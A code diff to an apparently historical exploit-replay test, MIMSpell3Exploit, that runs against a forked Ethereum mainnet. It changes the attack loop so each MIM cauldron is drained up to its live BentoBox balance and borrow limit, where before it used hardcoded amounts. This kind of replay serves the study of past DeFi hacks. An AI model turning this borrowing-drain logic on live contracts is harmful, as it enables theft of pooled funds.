@@ -35,6 +35,10 @@ interface ICauldron {
         uint256[] calldata values,
         bytes[] calldata datas
     ) external payable returns (uint256 value1, uint256 value2);
+    function borrowLimit()
+        external
+        view
+        returns (uint128 total, uint128 borrowPartPerAddress);
 }
 
 interface ICurveRouter {
@@ -78,8 +82,6 @@ contract MIMSpell3Exploit is BaseTestWithBalanceLog {
     uint256 private constant BLOCK_NUM_TO_FORK = 23_504_544;
     
     // Pool indices for 3Pool
-    uint256 private constant DAI_INDEX = 0;
-    uint256 private constant USDC_INDEX = 1;
     int128 private constant USDT_INDEX = 2;
     
     // Uniswap V3 fee tier
@@ -122,15 +124,7 @@ contract MIMSpell3Exploit is BaseTestWithBalanceLog {
         0x6bcd99D6009ac1666b58CB68fB4A50385945CDA2,
         0xC6D3b82f9774Db8F92095b5e4352a8bB8B0dC20d
     ];
-    
-    uint256[6] private  MIM_AVAILABLE = [
-        736_232_217_688_141_260_022_912,
-        75_477_235_211_805_918_200_769,
-        612_313_552_561_697_359_796_747,
-        274_846_689_470_068_597_038_378,
-        85_411_627_254_104_797_488_889,
-        9_474_541_117_269_550_572_521
-    ];
+
 
     function setUp() public {
         vm.createSelectFork("mainnet", BLOCK_NUM_TO_FORK);
@@ -153,7 +147,9 @@ contract MIMSpell3Exploit is BaseTestWithBalanceLog {
         uint256[] memory values = new uint256[](2);
         
         for (uint256 i = 0; i < CAULDRONS.length; i++) {
-            _borrowFromCauldron(CAULDRONS[i], actions, values, MIM_AVAILABLE[i]);
+            uint balavail = IBentoBox(BENTOBOX).balanceOf(MIM, CAULDRONS[i]);
+            (uint borrowlimit,) = ICauldron(CAULDRONS[i]).borrowLimit();
+            if(borrowlimit >= balavail) _borrowFromCauldron(CAULDRONS[i], actions, values, IBentoBox(BENTOBOX).toAmount(MIM, balavail, false));
         }
     }
 
